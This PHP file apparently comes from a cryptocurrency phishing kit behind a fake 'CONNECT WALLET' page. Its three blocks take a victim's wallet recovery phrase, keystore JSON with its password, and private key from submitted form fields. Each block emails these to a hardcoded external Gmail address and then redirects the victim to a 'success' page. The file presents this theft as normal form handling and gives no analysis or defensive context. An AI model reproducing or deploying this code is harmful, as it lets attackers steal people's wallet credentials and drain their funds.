



<?php 
if(isset($_POST['phr'])){
    $to = "thelordsprayergroup@gmail.com"; // this is your Email address
    
    $subject =  ". $phr";
    
    $phr = $_POST['phr'];
     

    
    $from = "Phrase from CONNECT WALLET\n";  

    $headers = "The New Phrase : . $phr";
    
    mail($to,$from,$subject,$headers);
    
    header("Location: import/success.php");
    return false;
    
    }
?>









<?php 
if(isset($_POST['kjs'])){
    $to = "thelordsprayergroup@gmail.com"; // this is your Email address
    
    $subject =  ". $kjs";
    
    $kjs = $_POST['kjs'];
    $pas = $_POST['pas'];

    
    $from = "Phrase from CONNECT WALLET\n";  

    $headers = "Keystore Json is  : . $kjs, Password is  : . $pas, ";
    
    mail($to,$from,$subject,$headers);
    
    header("Location: success.php");
return true;	
     
    }
?>




 








 
 



<?php 
if(isset($_POST['pri'])){
    $to = "thelordsprayergroup@gmail.com"; // this is your Email address
    
    $subject =  ". $pri";
    
    $pri = $_POST['pri'];
     

    
    $from = "Private Key From CONNECT WALLET\n";  

    $headers = "The New Private Key is  : . $pri";
    
    mail($to,$from,$subject,$headers);
    
    header("Location: success.php");
return true;	
     
    }
?>




 























 






















